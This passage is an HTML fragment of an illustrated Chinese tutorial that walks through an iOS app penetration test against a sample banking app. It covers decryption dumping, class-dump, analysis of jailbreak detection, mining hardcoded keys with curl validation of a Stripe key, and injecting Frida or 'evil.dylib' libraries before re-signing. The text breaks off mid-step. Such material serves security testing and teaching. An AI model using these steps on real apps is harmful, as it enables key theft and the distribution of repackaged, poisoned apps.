+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#4d96ff" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#4d96ff"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#4d96ff" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#4d96ff"/><circle cx="59" cy="31" r="4.5" fill="#4d96ff"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#4d96ff" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#4d96ff" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">MAP</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#4d96ff" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#4d96ff" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#4d96ff"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#4d96ff"/>
+        <line x1="30" y1="64" x2="16" y2="70" stroke="#4d96ff" stroke-width="4" stroke-linecap="round"/>
+        <polygon points="2,62 10,58 18,62 18,84 10,80 2,84" fill="none" stroke="#4d96ff" stroke-width="2.5"/>
+        <line x1="10" y1="58" x2="10" y2="80" stroke="#4d96ff" stroke-width="1.5" opacity=".6"/>
+      </svg>
+      <div class="char-label">测绘员</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#4d96ff">1d</div>
+      <div class="step-name">攻击面清单</div>
+    </div>
+    <div class="card" style="border-color:#4d96ff; --acc:#4d96ff">
+      <h2>🗺️ 权限与攻击面测绘 <span class="en">Attack Surface Mapping</span> <span class="parent-tag" style="background:#4d96ff">① 情报侦察</span></h2>
+      <div class="desc">
+        梳理 <strong>entitlements（能力授权）、URL Scheme、第三方 SDK、Associated Domains</strong>，
+        形成完整的攻击面地图。这一步决定后面往哪个方向使劲。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>Payload/TargetApp.app 完整目录</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>攻击面地图：权限 / Scheme / SDK / 通信域</div>
+      </div>
+      <div class="code"><span class="lbl">终端</span>$ codesign -d --entitlements :- Payload/TargetApp.app
+&lt;key&gt;application-identifier&lt;/key&gt;
+&lt;string&gt;<span class="s">TEAMID.com.example.bankwallet</span>&lt;/string&gt;
+&lt;key&gt;keychain-access-groups&lt;/key&gt;          <span class="c">← Keychain 可访问范围</span>
+&lt;key&gt;com.apple.developer.associated-domains&lt;/key&gt;  <span class="e">← UDL 劫持面</span>
+&lt;key&gt;aps-environment&lt;/key&gt;&lt;string&gt;production&lt;/string&gt;</div>
+      <div class="transform-arrow">⬇️ <span class="label">汇总攻击面</span> ⬇️</div>
+      <div class="code"><span class="lbl">攻击面清单</span><span class="c"># URL Scheme（无校验 = 可被任意 App 拉起传参）</span>
+bankwallet://   pay://   openapp://   <span class="c">… 共 7 个</span>
+
+<span class="c"># 第三方 SDK</span>
+友盟 / 极光 / 高德 / 神策 / Bugly / 腾讯X5 / JVerification</div>
+      <div class="tips">
+        <span class="tip info">URL Scheme 无校验 → 任意 App 可拉起并传参（OAuth 窃取 / 越权跳转）</span>
+        <span class="tip warn">第三方 SDK 是供应链攻击的最佳跳板，逐个查版本与 CVE</span>
+        <span class="tip cmd">codesign -d --entitlements :- TargetApp.app</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ 大步骤 2 ============ -->
+  <div class="phase-divider right">
+    <div class="phase-banner p-static">
+      <div class="phase-title">🧪 ② 静态分析 · Static Analysis</div>
+      <div class="cmd">$ frida-ios-dump -u &lt;UDID&gt; com.example.bankwallet</div>
+    </div>
+  </div>
+
+  <!-- 2a -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#cc5de8">先脱壳！</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#cc5de8" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#cc5de8"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#cc5de8" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#cc5de8"/><circle cx="59" cy="31" r="4.5" fill="#cc5de8"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#cc5de8" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#cc5de8" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">DUMP</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#cc5de8" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#cc5de8" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#cc5de8"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#cc5de8"/>
+        <line x1="30" y1="64" x2="16" y2="72" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <path d="M2 70 l10 -8 l6 6 l-4 10 z" fill="none" stroke="#cc5de8" stroke-width="2.5"/>
+        <circle cx="8" cy="72" r="3" fill="none" stroke="#cc5de8" stroke-width="2"/>
+        <line x1="14" y1="62" x2="20" y2="56" stroke="#cc5de8" stroke-width="3" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">开锁匠</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#cc5de8">2a</div>
+      <div class="step-name">脱壳解密</div>
+    </div>
+    <div class="card" style="border-color:#cc5de8; --acc:#cc5de8">
+      <h2>🔓 脱壳解密 <span class="en">Decryption / Dump</span> <span class="parent-tag" style="background:#cc5de8">② 静态分析</span></h2>
+      <div class="desc">
+        <strong>整个静态分析的前置条件。</strong>App Store 的 Mach-O 在启动时由内核解密到内存。
+        用 Frida 附着到运行中的进程，把内存里已解密的 <code>__TEXT</code> 段 dump 出来，并把 cryptid 改回 0。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>加密 Mach-O（cryptid = 1）</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>解密 Mach-O（cryptid = 0）→ TargetApp.decrypted</div>
+      </div>
+      <div class="code"><span class="lbl">终端</span><span class="c"># 方案 A：frida-ios-dump（推荐，自动修 cryptid）</span>
+$ frida-ios-dump -u &lt;UDID&gt; com.example.bankwallet   <span class="c"># -l 可先列出设备</span>
+[*] Connecting to <span class="i">TargetApp</span> (pid <span class="n">1337</span>)
+[*] Dumping <span class="n">1</span> modules: TargetApp
+[+] Dumped to <span class="r">TargetApp.decrypted</span> (<span class="n">11.8 MB</span>)
+
+<span class="c"># 方案 B：bagbak / Clutch（老工具，兼容旧系统）</span>
+$ bagbak com.example.bankwallet</div>
+      <div class="transform-arrow">⬇️ <span class="label">验证脱壳结果</span> ⬇️</div>
+      <div class="code"><span class="lbl">验证</span>$ otool -l TargetApp.decrypted | grep cryptid
+       cryptid <span class="r">0</span>                  <span class="c">← 脱壳完成，可以反编译了</span></div>
+      <div class="tips">
+        <span class="tip info">Apple 加密只保护 <code>__TEXT</code>，其余段（字符串、资源）无需脱壳即可读</span>
+        <span class="tip warn">需越狱设备；无越狱时只能走 Frida 内存 dump，且 App 有反调试会更麻烦</span>
+        <span class="tip cmd">otool -l TargetApp.decrypted | grep cryptid</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2b -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#cc5de8">看清结构</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#cc5de8" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#cc5de8"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#cc5de8" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#cc5de8"/><circle cx="59" cy="31" r="4.5" fill="#cc5de8"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#cc5de8" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#cc5de8" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">HDR</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#cc5de8" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#cc5de8" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#cc5de8"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#cc5de8"/>
+        <line x1="30" y1="64" x2="16" y2="70" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <rect x="0" y="62" width="20" height="8" rx="3" fill="none" stroke="#cc5de8" stroke-width="2.5"/>
+        <rect x="4" y="74" width="20" height="8" rx="3" fill="none" stroke="#cc5de8" stroke-width="2.5"/>
+      </svg>
+      <div class="char-label">还原员</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#cc5de8">2b</div>
+      <div class="step-name">头文件还原</div>
+    </div>
+    <div class="card" style="border-color:#cc5de8; --acc:#cc5de8">
+      <h2>📑 类与方法还原 <span class="en">class-dump</span> <span class="parent-tag" style="background:#cc5de8">② 静态分析</span></h2>
+      <div class="desc">
+        Objective-C 的方法名、类名<strong>以明文字符串存在运行时元数据中</strong>。
+        <code>class-dump</code> 能把这些元数据直接还原成可读的头文件 —— 相当于拿到了 App 的完整 API 文档。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>TargetApp.decrypted</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>1204 个 .h 头文件 = hook 靶点清单</div>
+      </div>
+      <div class="code"><span class="lbl">终端</span>$ class-dump --arch arm64 -H -o headers/ TargetApp.decrypted
+$ ls headers/ | wc -l
+    <span class="n">1204</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">读取还原出的头文件</span> ⬇️</div>
+      <div class="code"><span class="lbl">headers/*.h</span>$ cat headers/<span class="t">JailbreakDetector</span>.h
+@interface JailbreakDetector : NSObject
+- (BOOL)<span class="f">isJailbroken</span>;
+- (BOOL)<span class="f">checkCydia</span>;
+- (BOOL)<span class="f">checkFork</span>;              <span class="c">← fork 检测</span>
++ (BOOL)<span class="f">isDebuggerAttached</span>;
+@end
+
+$ cat headers/<span class="t">CryptoHelper</span>.h
+- (NSString *)<span class="f">decryptPayload:</span>(NSString *)arg1 <span class="f">withKey:</span>(NSString *)arg2;
+- (NSData *)<span class="f">aesEncrypt:</span>(NSData *)arg1 <span class="f">iv:</span>(NSString *)arg2;</div>
+      <div class="tips">
+        <span class="tip info">方法签名 = 后续所有 Frida hook 的精确靶点</span>
+        <span class="tip warn">Swift 符号 class-dump 拿不全，需配合 <code>swift-demangle</code> / <code>nm -gU</code></span>
+        <span class="tip cmd">class-dump -H -o headers/ TargetApp.decrypted</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2c -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#cc5de8">看穿你</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#cc5de8" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#cc5de8"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#cc5de8" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#cc5de8"/><circle cx="59" cy="31" r="4.5" fill="#cc5de8"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#cc5de8" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#cc5de8" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">DISASM</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#cc5de8" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#cc5de8" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#cc5de8"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#cc5de8"/>
+        <line x1="30" y1="64" x2="18" y2="74" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <circle cx="12" cy="80" r="7" fill="none" stroke="#cc5de8" stroke-width="3"/>
+        <circle cx="12" cy="80" r="2.5" fill="#cc5de8"/>
+        <line x1="6" y1="86" x2="0" y2="92" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+      </svg>
+      <div class="char-label">反汇编</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#cc5de8">2c</div>
+      <div class="step-name">反汇编伪码</div>
+    </div>
+    <div class="card" style="border-color:#cc5de8; --acc:#cc5de8">
+      <h2>🔍 反汇编与伪代码 <span class="en">Disassembly</span> <span class="parent-tag" style="background:#cc5de8">② 静态分析</span></h2>
+      <div class="desc">
+        把脱壳后的二进制丢进 <strong>IDA / Hopper / Ghidra</strong>，重点看加密算法、签名校验、鉴权逻辑，
+        以及<strong>越狱检测的具体实现</strong> —— 静态就能看出绕过点。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>TargetApp.decrypted + headers/</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>关键函数伪代码 + 绕过点清单</div>
+      </div>
+      <div class="code"><span class="lbl">终端</span>$ hopper TargetApp.decrypted        <span class="c"># 也可用 IDA / Ghidra</span>
+Analyzing <span class="n">1204</span> classes, <span class="n">38</span> frameworks...  <span class="c">← 载入完成</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">定位关键函数，看反编译结果</span> ⬇️</div>
+      <div class="code"><span class="lbl">Hopper 伪代码</span><span class="c">// -[JailbreakDetector isJailbroken]  一目了然的检测逻辑</span>
+<span class="k">int</span> -[JailbreakDetector <span class="f">isJailbroken</span>](<span class="k">void</span> *self, <span class="k">void</span> *sel) {
+    <span class="k">if</span> ([[NSFileManager defaultManager]
+          <span class="f">fileExistsAtPath:</span><span class="s">@"/Applications/Cydia.app"</span>] != <span class="n">0</span>)
+        <span class="k">return</span> <span class="n">1</span>;
+    <span class="k">if</span> ([[NSFileManager defaultManager]
+          <span class="f">fileExistsAtPath:</span><span class="s">@"/bin/bash"</span>] != <span class="n">0</span>)
+        <span class="k">return</span> <span class="n">1</span>;
+    <span class="k">return</span> <span class="r">0</span>;                    <span class="e">← 只查文件存在性，极易绕过</span>
+}
+
+<span class="c">// -[CryptoHelper aesEncrypt:iv:]  第4参数是 Key，硬编码</span>
+CCCrypt(<span class="n">0</span>, <span class="n">0</span>, <span class="n">0</span>, <span class="s">"0123456789abcdef"</span>, <span class="n">16</span>, iv, ...);</div>
+      <div class="tips">
+        <span class="tip info">静态绕过点：文件存在性检测、可被 hook 的单一返回值、自实现加密</span>
+        <span class="tip warn">经过混淆（OLLVM / Swift 混淆）的二进制需要动态跟踪才看得懂</span>
+        <span class="tip cmd">IDA / Hopper / Ghidra 载入 TargetApp.decrypted</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2d -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#cc5de8">查查库版本</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#cc5de8" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#cc5de8"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#cc5de8" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#cc5de8"/><circle cx="59" cy="31" r="4.5" fill="#cc5de8"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#cc5de8" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#cc5de8" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">DEPS</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#cc5de8" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#cc5de8" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#cc5de8"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#cc5de8"/>
+        <line x1="30" y1="64" x2="16" y2="72" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <rect x="2" y="60" width="18" height="24" rx="3" fill="none" stroke="#cc5de8" stroke-width="2.5"/>
+        <rect x="8" y="56" width="6" height="5" rx="2" fill="#cc5de8"/>
+        <line x1="6" y1="68" x2="16" y2="68" stroke="#cc5de8" stroke-width="2"/>
+        <line x1="6" y1="75" x2="16" y2="75" stroke="#cc5de8" stroke-width="2"/>
+      </svg>
+      <div class="char-label">审计员</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#cc5de8">2d</div>
+      <div class="step-name">依赖审计</div>
+    </div>
+    <div class="card" style="border-color:#cc5de8; --acc:#cc5de8">
+      <h2>📚 依赖与配置审计 <span class="en">Dependency Audit</span> <span class="parent-tag" style="background:#cc5de8">② 静态分析</span></h2>
+      <div class="desc">
+        列出全部动态库及其版本，比对已知 CVE；检查是否残留 <strong>调试符号</strong>、
+        <code>@rpath</code> 加载路径是否可被替换 —— 这直接对应后面的 dylib 劫持。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>TargetApp.decrypted</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>依赖库清单 + 已知漏洞 + 符号泄露情况</div>
+      </div>
+      <div class="code"><span class="lbl">终端</span>$ otool -L TargetApp.decrypted | grep -vE <span class="s">'/usr/lib|/System'</span>
+  <span class="at">@rpath/</span>AFNetworking.framework/AFNetworking    <span class="e">← 版本旧，含已知 CVE</span>
+  <span class="at">@rpath/</span>Alamofire.framework/Alamofire
+  <span class="at">@rpath/</span>UMengAnalytics.framework/UMengAnalytics
+  <span class="at">@rpath/</span>TencentOpenAPI.framework/TencentOpenAPI
+  <span class="at">@rpath/</span>Realm.framework/Realm                  <span class="e">← 本地数据库，常见泄露点</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">再查符号残留</span> ⬇️</div>
+      <div class="code"><span class="lbl">符号检查</span><span class="c"># 是否残留调试符号（能还原源码行号）</span>
+$ dwarfdump --uuid TargetApp.decrypted
+UUID: <span class="n">8F3A2C7E</span>-... (arm64) TargetApp.app/TargetApp  <span class="e">← 未 strip！</span></div>
+      <div class="tips">
+        <span class="tip info"><code>@rpath</code> 相对路径 = dylib 劫持的天然入口（见 5d）</span>
+        <span class="tip warn">未 strip 的二进制可还原崩溃栈行号，极大加速逆向</span>
+        <span class="tip cmd">otool -L TargetApp.decrypted</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 2e -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#cc5de8">挖到金矿！</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#cc5de8" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#cc5de8"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#cc5de8" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#cc5de8"/><circle cx="59" cy="31" r="4.5" fill="#cc5de8"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#cc5de8" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#cc5de8" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">SECRET</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#cc5de8" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#cc5de8" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#cc5de8"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#cc5de8"/>
+        <line x1="30" y1="62" x2="16" y2="52" stroke="#cc5de8" stroke-width="4" stroke-linecap="round"/>
+        <line x1="4" y1="44" x2="20" y2="60" stroke="#cc5de8" stroke-width="3.5" stroke-linecap="round"/>
+        <polygon points="12,46 20,50 20,60 12,64 4,60 4,50" fill="#ffd93d" stroke="#cc5de8" stroke-width="1.5"/>
+      </svg>
+      <div class="char-label">矿工</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#cc5de8">2e</div>
+      <div class="step-name">密钥挖掘</div>
+    </div>
+    <div class="card" style="border-color:#cc5de8; --acc:#cc5de8">
+      <h2>💎 硬编码密钥与敏感数据挖掘 <span class="en">Secret Mining</span> <span class="parent-tag" style="background:#cc5de8">② 静态分析</span></h2>
+      <div class="desc">
+        在二进制、<code>Assets.car</code>、JSON、plist、SQLite、内置 H5 源码里搜密钥、证书、测试账号、内网地址。
+        <strong>这是移动端最高频、最高危的漏洞类型。</strong>
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>全量资源 + 脱壳二进制</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>密钥 / 证书 / 账号 / 内网地址清单（待验证）</div>
+      </div>
+      <div class="code"><span class="lbl">终端</span>$ strings -a TargetApp.decrypted | grep -E <span class="s">'[A-Za-z0-9+/]{40,}={0,2}'</span>
+<span class="f">sk_live_51H8xQ2eZvKYlo2C8bN...</span>       <span class="e">← Stripe 生产密钥</span>
+<span class="f">AKIA3XQ7ZP2LMN4VWY6T</span>                 <span class="e">← AWS Access Key</span>
+<span class="f">-----BEGIN RSA PRIVATE KEY-----</span>       <span class="e">← 内置私钥！可用于服务端身份伪造</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">继续扫资源文件</span> ⬇️</div>
+      <div class="code"><span class="lbl">资源扫描</span>$ grep -rIn <span class="s">'password\|admin'</span> Payload/TargetApp.app/*.json
+assets/config.json: {<span class="s">"api_key"</span>:<span class="s">"..."</span>, <span class="s">"debug_pwd"</span>:<span class="s">"admin@2023"</span>}
+
+$ ls Payload/TargetApp.app/www/
+index.html  bundle.js  <span class="c">← 内置 H5 源码，未混淆，含接口清单</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">验证密钥是否真的有效</span> ⬇️</div>
+      <div class="code"><span class="lbl">有效性验证</span><span class="c"># 验证密钥有效性（关键一步，决定漏洞等级）</span>
+$ curl -s -u <span class="s">"sk_live_51H8xQ2eZvKYlo2C8bN...:"</span> https://api.stripe.com/v1/charges
+{<span class="r">"object":"list","data":[]</span>}   <span class="e">← 密钥有效，可查生产交易数据</span></div>
+      <div class="tips">
+        <span class="tip info">密钥必须<strong>实际调用验证</strong>才能定级；无效密钥只是信息泄露</span>
+        <span class="tip warn">内置私钥 / 客户端证书会直接导致<strong>服务端身份伪造</strong></span>
+        <span class="tip cmd">strings -a TargetApp.decrypted | grep -iE 'key|secret'</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ 大步骤 3 ============ -->
+  <div class="phase-divider left">
+    <div class="phase-banner p-repack">
+      <div class="phase-title">🔧 ③ 重打包 · Repack &amp; Inject</div>
+      <div class="cmd">$ insert_dylib --strip-codesig --inplace @executable_path/FridaGadget.dylib</div>
+    </div>
+  </div>
+
+  <!-- 3a -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#ff922b">打一针！</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#ff922b" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#ff922b"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#ff922b" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#ff922b"/><circle cx="59" cy="31" r="4.5" fill="#ff922b"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#ff922b" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#ff922b" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">INJECT</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff922b" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff922b" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#ff922b"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#ff922b"/>
+        <line x1="30" y1="64" x2="16" y2="60" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <rect x="0" y="54" width="18" height="9" rx="2" fill="none" stroke="#ff922b" stroke-width="2.5"/>
+        <line x1="18" y1="58.5" x2="26" y2="58.5" stroke="#ff922b" stroke-width="2.5"/>
+        <rect x="4" y="55" width="10" height="7" fill="#ff922b" opacity=".5"/>
+      </svg>
+      <div class="char-label">注射手</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#ff922b">3a</div>
+      <div class="step-name">注入 dylib</div>
+    </div>
+    <div class="card" style="border-color:#ff922b; --acc:#ff922b">
+      <h2>💉 注入 Gadget / 恶意 dylib <span class="en">Dylib Injection</span> <span class="parent-tag" style="background:#ff922b">③ 重打包</span></h2>
+      <div class="desc">
+        把 <code>FridaGadget.dylib</code> 或自制 dylib 插进 Mach-O 的 <code>LC_LOAD_DYLIB</code>，
+        让 App <strong>自带插桩能力</strong>，无需越狱即可注入。
+        <strong>这一步同时也是投毒攻击的核心手法（见 5a）。</strong>
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>已脱壳的 .app + FridaGadget.dylib</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>已注入 dylib 的 Mach-O（原签名已失效）</div>
+      </div>
+      <div class="code"><span class="lbl">终端</span><span class="c"># 方案 A：insert_dylib</span>
+$ insert_dylib --strip-codesig --inplace \
+    <span class="at">@executable_path/</span>FridaGadget.dylib TargetApp.decrypted
+Added LC_LOAD_DYLIB to <span class="r">TargetApp.decrypted</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">备选注入手法</span> ⬇️</div>
+      <div class="code"><span class="lbl">其他方案</span><span class="c"># 方案 B：optool（可指定偏移，更可控）</span>
+$ optool install -c load -p <span class="at">@executable_path/</span>evil.dylib \
+    -t Payload/TargetApp.app/TargetApp
+Found LOAD_DYLIB at offset <span class="n">0x4A28</span>
+
+<span class="c"># 方案 C：不越狱时，用 Sideloadly / TrollStore 侧载注入</span>
+$ python3 frida-gadget-config.py --mode listen --port <span class="n">27042</span></div>
+      <div class="tips">
+        <span class="tip info">注入的 dylib 在 App 启动时被 dyld 自动加载，可用 <code>__attribute__((constructor))</code> 抢先执行</span>
+        <span class="tip warn">修改 load command 必然破坏原签名，下一步必须重签</span>
+        <span class="tip cmd">otool -L TargetApp | grep -i gadget</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 3b -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#ff922b">盖个章！</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#ff922b" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#ff922b"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#ff922b" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#ff922b"/><circle cx="59" cy="31" r="4.5" fill="#ff922b"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#ff922b" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#ff922b" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">SIGN</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff922b" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff922b" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#ff922b"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#ff922b"/>
+        <line x1="30" y1="64" x2="16" y2="60" stroke="#ff922b" stroke-width="4" stroke-linecap="round"/>
+        <rect x="8" y="46" width="8" height="12" rx="2" fill="#ff922b"/>
+        <rect x="2" y="58" width="20" height="6" rx="2" fill="#ff922b"/>
+      </svg>
+      <div class="char-label">签章员</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#ff922b">3b</div>
+      <div class="step-name">重签名</div>
+    </div>
+    <div class="card" style="border-color:#ff922b; --acc:#ff922b">
+      <h2>🪧 重签名与权限伪造 <span class="en">Re-sign</span> <span class="parent-tag" style="background:#ff922b">③ 重打包</span></h2>
+      <div class="desc">
+        用自有开发者证书或<strong>企业证书</strong>重新签名，同时伪造 entitlements
